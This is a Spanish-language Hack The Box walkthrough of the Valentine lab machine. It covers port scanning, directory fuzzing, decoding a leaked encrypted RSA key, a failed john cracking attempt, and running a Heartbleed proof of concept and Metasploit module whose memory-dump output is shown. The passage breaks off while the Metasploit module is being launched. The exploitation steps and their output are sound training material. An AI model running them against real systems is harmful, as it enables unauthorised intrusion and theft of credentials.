---
title: "Valentine - Hack The Box"
date: 2023-04-21
draft: false
slug: "htb-writeup-valentine"
excerpt: "Esta fue una máquina relativamente sencilla, investigaremos el puerto HTTP que con la ayuda de nmap y haciendo Fuzzing, encontramos una página que nos dara información valiosa como una llave privada en base hexadecimal. La desciframos, pero estara encriptada por lo que no nos servira hasta más adelante. Con la ayuda de nmap encontramos un Exploit llamado Heartbleed con el cual capturaremos data que nos ayudara a descifrar al fin la llave privada y nos dara una contraseña para el SSH, usando el Exploit CVE-2018-15473 pondremos nombres randoms y encontraremos un usuario con el cual entramos. Para escalar privilegios, usamos la herramienta Tmux, que encontramos en el historial de Bash y que nos metera a una nueva terminal como Root (CVE-2011-1496)."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Fuzzing", "Information Leakage", "Cracking SSH Key", "SSL Heartbleed Exploitation", "SSH User Enumeration", "CVE-2018-15473 (SSH User Enumeration)", "Tmux", "Privesc - CVE-2011-1496", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "nano"
  - "cat"
  - "tr"
  - "xxd"
  - "wget"
  - "ssh2john"
  - "python2"
  - "johntheripper"
  - "git"
  - "grep"
  - "metasploit framework(msfconsole)"
  - "Módulo: auxiliary/scanner/ssl/openssl_heartbleed"
  - "searchsploit"
  - "ssh"
  - "id"
  - "tmux"
links:
  - "https://www.enmimaquinafunciona.com/pregunta/182823/sed-para-eliminar-los-espacios-en-blanco"
  - "https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/"
  - "https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py"
  - "https://github.com/mpgn/heartbleed-PoC"
  - "https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/"
  - "https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported"
  - "https://stackoverflow.com/questions/26705755/tmux-how-do-i-find-out-the-currently-running-version-of-tmux"
  - "https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-valentine/valentine_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL sabremos que SO opera en dicha máquina.
```bash
ping -c 4 10.10.10.79                                                                                                      
PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.
64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=137 ms
64 bytes from 10.10.10.79: icmp_seq=2 ttl=63 time=129 ms
64 bytes from 10.10.10.79: icmp_seq=3 ttl=63 time=129 ms
64 bytes from 10.10.10.79: icmp_seq=4 ttl=63 time=129 ms

--- 10.10.10.79 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 128.773/131.114/137.170/3.505 ms
```
Por el TTL, sabemos que la máquina usa Linux. Ahora, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.79 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 12:09 CST
Initiating SYN Stealth Scan at 12:09
Scanning 10.10.10.79 [65535 ports]
Discovered open port 22/tcp on 10.10.10.79
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 80/tcp on 10.10.10.79
Completed SYN Stealth Scan at 12:09, 28.06s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up, received user-set (1.9s latency).
Scanned at 2023-04-21 12:09:04 CST for 28s
Not shown: 53231 filtered tcp ports (no-response), 12301 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds
           Raw packets sent: 126157 (5.551MB) | Rcvd: 12366 (494.692KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 3 puertos abiertos, dos ya los conocemos, pero al ver el puerto 80 y el puerto 443 me da la impresión que el puerto 80 nos va a redireccionar al puerto 443. Hagamos un escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p22,80,443 10.10.10.79 -oN targeted                       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 12:10 CST
Nmap scan report for 10.10.10.79
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))

|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))

|_http-title: Site doesn't have a title (text/html).
|_ssl-date: 2023-04-21T18:10:30+00:00; +1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.49 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Me da mucha curiosidad ese puerto 443, pero primero vamos a investigar la página web del puerto 80.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos.

![](/assets/images/htb-writeup-valentine/Captura1.png)

Buena imagen, pero no hay nada de nada, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-valentine/Captura2.png">
</p>

Utiliza **PHP**, con eso ya tenemos varios vectores de ataque, veamos si con **whatweb** nos da otro dato:
```bash
whatweb http://10.10.10.79
http://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```
Nada que nos sea útil.

Te diría que buscaramos en el código fuente, pero no encontraras nada aparte de la imagen, tanto en el **puerto 80/HTTP** como en el **puerto 443/HTTPS**, mejor apliquemos **Fuzzing** de una vez.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.79/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000035:   403        10 L     30 W       287 Ch      "cgi-bin"                                                            
000000015:   200        1 L      2 W        38 Ch       "index"                                                              
000000014:   200        1 L      2 W        38 Ch       "http://10.10.10.79//"                                               
000000834:   200        15 L     66 W       1097 Ch     "dev"                                                                
000000083:   403        10 L     30 W       285 Ch      "icons"                                                              
000000222:   403        10 L     30 W       283 Ch      "doc"                                                                
000023112:   200        27 L     54 W       554 Ch      "encode"                                                             
000024243:   200        25 L     54 W       552 Ch      "decode"                                                             
000045240:   200        1 L      2 W        38 Ch       "http://10.10.10.79//"                                               
000095524:   403        10 L     30 W       293 Ch      "server-status"                                                      

Total time: 575.5224
Processed Requests: 220560
Filtered Requests: 220537
Requests/sec.: 383.2344
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **Gobuster**, aunque vamos a enfocarlo en archivos **PHP** y **TXT** para ver si encuentra algo útil:
```bash
gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.79/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 38]
/index                (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]
/encode.php           (Status: 200) [Size: 554]
/decode               (Status: 200) [Size: 552]
/decode.php           (Status: 200) [Size: 552]
/omg                  (Status: 200) [Size: 153356]
/server-status        (Status: 403) [Size: 292]
Progress: 661676 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar la busqueda especifica de extensiones de archivos. |

Nada más por probar, veamos que nos puede reportar **nmap** si le decimos que aplique **Fuzzing**:
```bash
nmap --script http-enum -p80 10.10.10.79 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 12:12 CST
Nmap scan report for 10.10.10.79
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http

| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```
Vamos a analizar el directorio **dev** que encontró **nmap, gobuster y wfuzz**, esto porque puede ser de un desarrollador, a lo mejor puso algo ahí de utilidad.

### Enumerando Directorios Encontrados {#Dirs}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-valentine/Captura3.png">
</p>

Ok, encontramos dos cosillas, veamos de que se trata, primero vamos a ver el archivo de texto:

<p align="center">
<img src="/assets/images/htb-writeup-valentine/Captura4.png">
</p>

| **Traducción** |
|:-----------:|
| *Para hacer: <br> 1) Café. <br> 2) Investigar. <br> 3) Arreglar el decodificador/codificador antes de ponerlo en marcha. <br> 4) Asegurarse de que la codificación/decodificación sólo se realiza en el lado del cliente. <br> 5) No usar el decodificador/codificador hasta que todo esto esté hecho. <br> 6) Encontrar una forma mejor de tomar notas.* |

Esto es un mensaje de un desarrollador, menciona 2 páginas llamadas **encoder y decoder** que aparecieron en el **Fuzzing**. 

Ahora veamos el otro archivo:

<p align="center">
<img src="/assets/images/htb-writeup-valentine/Captura5.png">
</p>

Esto me suena a que es una llave pública o privada, está en hexadecimal, por lo que podemos descifrar que es.

Bien, ya entramos en **dev**, veamos el de **encode**:

![](/assets/images/htb-writeup-valentine/Captura6.png)

Ahora veamos la página **decode**:

![](/assets/images/htb-writeup-valentine/Captura7.png)

Pues no nos sirve de mucho esto, me parece que **encode** transforma la data que le pongas en **base64** y el **decode** lo descifra.

Con esto creo que ya revisamos todo.

Veamos si podemos descifrar la llave en hexadecimal.

### Descifrando Llave en Hexadecimal {#Llave}

Vamos a copiar todo eso en un archivo:
```bash
nano key
```

Después de guardar y cerrar, vamos a utilizar el comando **tr** para eliminar los espacios:
```bash
cat key | tr -d ' '                                          
2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0d0a50726f632d547970653a20...
```

Y con el comando **xxd**, vamos a descifrar esta llave:
```bash
cat key | tr -d ' ' | xxd -ps -r
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
...
```

¡Listo! Pero nos menciona que está encriptada, vamos a tratar de desencriptarla. 

El siguiente blog, explica como hacerlo:
* <a href="https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/" target="_blank">Password Cracking 101: John The Ripper Password Cracking SSH Keys</a>

Pero, necesitamos la herramienta **ssh2john**, que la puedes encontrar aquí:
* <a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/sshng2john.py" target="_blank">Repositorio de truongkma: ssh2john.py</a>

Vamos a copiar ese script con el comando **wget**:
```bash
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
--2023-04-21 14:42:03--  https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
Resolviendo github.com (github.com)... 140.82.113.3
Conectando con github.com (github.com)[140.82.113.3]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: no especificado [text/html]
Grabando a: «sshng2john.py»

ssh2john.py            100%[=======================>]   9.45K  --.-KB/s    en 0.001s

2023-04-21 14:42:04 (1.61 MB/s) - «ssh2john.py» guardado [533071]
```

Puedes ver que ya se copió:
```bash
ls
heartbleed-PoC  sshng2john.py
```

Ahora copiemos la llave privada en un archivo llamado **id_rsa** y dale los permisos para esta clase de llaves:
```bash
nano id_rsa
chmod 600 id_rsa
```

Después de guardar y salir, usaremos la herramienta que descargamos junto con el archivo **id_rsa** para convertir esta llave en un hash que la herramienta **john** pueda descifrar. 

Hagámoslo entonces:
```bash
python2 sshng2john.py id_rsa > hash
```

Y al fin, descifremos el **hash**:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:11 DONE (2023-04-21 15:03) 0g/s 1262Kp/s 1262Kc/s 1262KC/s *7¡Vamos!
Session completed.
```
Fue un intento fallido para descifrar la llave.

Y ya, pues, no encuentro otra forma de vulnerar la página, así que vamos a ver si **nmap** nos puede decir si un puerto tienen alguna vulnerabilidad.

### Buscando Vulnerabilidades Web con NMAP {#NMAP}

```bash
nmap --script "vuln and safe" -p443 10.10.10.79 -oN newWebScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 13:10 CST
Nmap scan report for 10.10.10.79
Host is up (0.13s latency).

PORT    STATE SERVICE
443/tcp open  https

| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       http://www.openssl.org/news/secadv_20140407.txt 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf

Nmap done: 1 IP address (1 host up) scanned in 24.55 seconds
```
**NOTA**: Utilice el puerto 443 porque no funciono con el puerto 80.

Muy bien, el único Exploit vulnerable que veo es el de **Heartbleed**, pero no sé dé que se trate, vamos a investigarlo:

| **Ataque Heartbleed** |
|:-----------:|
| *Heartbleed es un agujero de seguridad de software en la biblioteca de código abierto OpenSSL, solo vulnerable en su versión 1.0.1f, que permite a un atacante leer la memoria de un servidor o un cliente, permitiéndole por ejemplo, conseguir las claves privadas SSL de un servidor.* |

Vamos a usar este Exploit, pero me llama la atención que en las imágenes aparece un corazón similar al de la página index:

<p align="center">
<img src="/assets/images/htb-writeup-valentine/Captura9.png">
</p>

¿Nos estaban dando una pista desde el principio?

Entonces vamos a buscar un Exploit.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando el Exploit Heartbleed {#Exploit}

Mira encontré este:
* <a href="https://github.com/mpgn/heartbleed-PoC" target="_blank">Repositorio de mpgn: Heartbleed PoC</a>

Por lo que entiendo, el Exploit tratara de extraer información almacenada en la memoria del servidor de la máquina y lo guardara en un archivo llamado **out.txt**. 

Vamos a clonarlo y a probarlo:
```bash
git clone https://github.com/mpgn/heartbleed-PoC.git            
Clonando en 'heartbleed-PoC'...
remote: Enumerating objects: 19, done.
remote: Total 19 (delta 0), reused 0 (delta 0), pack-reused 19
Recibiendo objetos: 100% (19/19), 5.79 KiB | 456.00 KiB/s, listo.
Resolviendo deltas: 100% (4/4), listo.
```

Nos metemos al directorio que se creó y vamos a probar el Exploit:
```bash
python2 heartbleed-exploit.py 10.10.10.79                                                                                  
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
```

Saco algo, puedes ver que se creó un archivo llamado **out.txt**:
```bash
ls
heartbleed-exploit.py  out.txt  README.md  utils
```

**OJO:** utilice el comando **grep** para eliminar parte del output que se repitió mucho, aquí tienes una página que muestra lo útil del comando **grep**:
* <a href="https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/" target="_blank">Uso del comando grep en Linux y UNIX con ejemplos</a>

Ahora sí, veamos el contenido:
```bash
cat out.txt | grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D DC  mV0aGVoeXBlCg==.
  0160: ED 31 5B 67 F5 75 B8 0D 1E 81 12 F4 5D 82 43 29  .1[g.u......].C)
  0170: 26 C9 B8 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  &...............
  0180: 2E 31 2E 30 35 31 36 30 3C 2F 76 65 72 73 69 6F  .1.05160</versio
  0190: 6E 3E 0A 3C 64 65 76 69 63 65 2D 69 64 20 64 65  n>.<device-id de
  01a0: 76 69 63 65 2D 74 79 70 65 3D 22 4D 61 63 42 6F  vice-type="MacBo
  01b0: 6F 6B 41 69 72 34 2C 31 22 20 70 6C 61 74 66 6F  okAir4,1" platfo
  01c0: 72 6D 2D 76 65 72 73 69 6F 6E 3D 22 31 30 2E 39  rm-version="10.9
  01d0: 2E 32 22 20 75 6E 69 71 75 65 2D 69 64 3D 22 34  .2" unique-id="4
  01e0: 37 30 45 35 31 34 41 35 46 46 33 39 35 35 46 45  70E514A5FF3955FE
  01f0: 44 31 35 42 44 46 31 30 31 31 33 42 39 38 30 30  D15BDF10113B9800
  0200: 38 45 35 39 32 30 46 31 30 32 42 36 38 42 34 36  8E5920F102B68B46
  0210: 43 41 31 41 39 32 42 41 33 45 36 43 37 36 43 30  CA1A92BA3E6C76C0
  0220: 35 32 41 38 33 39 41 34 43 35 41 34 30 46 41 44  52A839A4C5A40FAD
  0230: 39 43 37 33 45 32 45 32 31 34 45 39 42 42 39 30  9C73E2E214E9BB90
  0240: 45 33 39 32 44 33 36 39 38 31 45 39 30 39 36 39  E392D36981E90969
  0250: 35 44 44 34 30 42 36 32 30 35 42 42 30 34 43 22  5DD40B6205BB04C"
  0260: 3E 6D 61 63 2D 69 6E 74 65 6C 3C 2F 64 65 76 69  >mac-intel</devi
  0270: 63 65 2D 69 64 3E 0A 3C 6D 61 63 2D 61 64 64 72  ce-id>.<mac-addr
  0280: 65 73 73 2D 6C 69 73 74 3E 0A 3C 6D 61 63 2D 61  ess-list>.<mac-a
  0290: 64 64 72 65 73 73 3E 36 37 63 36 65 34 34 39 37  ddress>67c6e4497
  02a0: 63 39 38 3C 2F 6D 61 63 2D 61 64 64 72 65 73 73  c98</mac-address
  02b0: 3E 3C 2F 6D 61 63 2D 61 64 64 72 65 73 73 2D 6C  ></mac-address-l
  02c0: 69 73 74 3E 0A 3C 67 72 6F 75 70 2D 73 65 6C 65  ist>.<group-sele
  02d0: 63 74 3E 56 50 4E 3C 2F 67 72 6F 75 70 2D 73 65  ct>VPN</group-se
  02e0: 6C 65 63 74 3E 0A 3C 67 72 6F 75 70 2D 61 63 63  lect>.<group-acc
  02f0: 65 73 73 3E 68 74 74 70 73 3A 2F 2F 31 30 2E 31  ess>https://10.1
  0300: 30 2E 31 30 2E 37 39 3A 34 34 33 3C 2F 67 72 6F  0.10.79:443</gro
  0310: 75 70 2D 61 63 63 65 73 73 3E 0A 3C 2F 63 6F 6E  up-access>.</con
  0320: 66 69 67 2D 61 75 74 68 3E 77 3F A7 F5 07 8F 0C  fig-auth>w?.....
  0330: E1 1B 6C 72 CC 6C 79 97 8E D9 7B 79 87 02 02 02  ..lr.ly...{y....
  1f60: 71 D4 00 00 00 00 00 00 00 00 00 00 00 00 00 00  q...............
```

Veo dos cosillas que nos pueden servir, una es esta que es una variable con data en **base64**:
```bash
0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D DC  mV0aGVoeXBlCg==.
```

Y la otra es esta:
```bash
unique-id="4
  01e0: 37 30 45 35 31 34 41 35 46 46 33 39 35 35 46 45  70E514A5FF3955FE
  01f0: 44 31 35 42 44 46 31 30 31 31 33 42 39 38 30 30  D15BDF10113B9800
  0200: 38 45 35 39 32 30 46 31 30 32 42 36 38 42 34 36  8E5920F102B68B46
  0210: 43 41 31 41 39 32 42 41 33 45 36 43 37 36 43 30  CA1A92BA3E6C76C0
  0220: 35 32 41 38 33 39 41 34 43 35 41 34 30 46 41 44  52A839A4C5A40FAD
  0230: 39 43 37 33 45 32 45 32 31 34 45 39 42 42 39 30  9C73E2E214E9BB90
  0240: 45 33 39 32 44 33 36 39 38 31 45 39 30 39 36 39  E392D36981E90969
  0250: 35 44 44 34 30 42 36 32 30 35 42 42 30 34 43 22  5DD40B6205BB04C"
```
El problema es que no identifico en que está encodeado la variable **unique-id**, entonces la voy a descartar de momento.

Además, nos indica una **MAC** de, al parecer, un dispositivo **Apple**, qué raro, bien veamos si podemos descifrar la variable **text**.

### Usando Módulo Auxiliar de Metasploit para Explotar Heartbleed {#Metas}

Dentro de **Metasploit** tenemos un módulo que podemos usar para identificar la vulnerabilidad **Heartbleed** y dumpear la memoria del servidor al mismo tiempo.

Vamos a sacarlo por pasos.

* Inicia **Metasploit**:
```bash
msfconsole
```

* Busca y usa el módulo de escaneo de **Heartbleed**:

```bash
msf6 > search heartbleed
-
Matching Modules
================
   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
-
Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed
-
msf6 > use 1
msf6 auxiliary(scanner/ssl/openssl_heartbleed) >
```

* Configura el módulo:
```bash
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 10.10.10.79
RHOSTS => 10.10.10.79
msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set VERBOSE true
VERBOSE => true
```

* Activalo:
```bash
